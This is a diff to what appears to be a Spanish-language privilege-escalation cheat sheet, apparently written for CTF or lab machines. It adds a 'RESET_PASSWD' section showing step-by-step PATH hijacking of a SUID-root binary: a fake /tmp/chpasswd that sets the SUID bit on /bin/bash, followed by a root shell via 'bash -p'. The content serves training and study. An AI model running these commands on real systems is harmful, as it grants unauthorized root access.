@@ -185,10 +185,41 @@ Paso 4:
 ❯ /home/archangel/secret/backup    # Ejecutar 
 
 Paso 5:
-# Escalas
+# Escalar
 ❯ /bin/bash -p
 ❯ whoami
 
 NOTA: 
 	- Tambien se puede hacer en forma de revershell 
+```
+
+## RESET_PASSWD
+```bash 
+-rwsr-xr-x 1 root root    /home/john/RESET_PASSWD
+
+Paso 1:
+❯ strings RESET_PASSWD    # Mirar cadenas en binarios 
+	echo kiero:kiero | chpasswd  # Esto muestra el binario 
+
+NOTA:
+	- El candidato para el 'path hijacking' sería chpasswd ya que echo es un comando interno de 'sh'
+
+
+Paso 2: Hacer un 'Path Hijacking'
+# Crear el 'chpasswd' falso en el dir /tmp
+❯ echo '#!/bin/bash' > /tmp/chpasswd
+❯ echo 'chmod +s /bin/bash' >> /tmp/chpasswd
+❯ chmod +x /tmp/chpasswd
+
+Paso 3:
+# Modificar el PATH para que primero busque en '/tmp'
+❯ export PATH=/tmp:$PATH
+
+Paso 4:
+❯ /home/john/RESET_PASSWD    # Ejecutar 
+
+Paso 5:
+# Escalar
+❯ /bin/bash -p
+❯ whoami
 ```
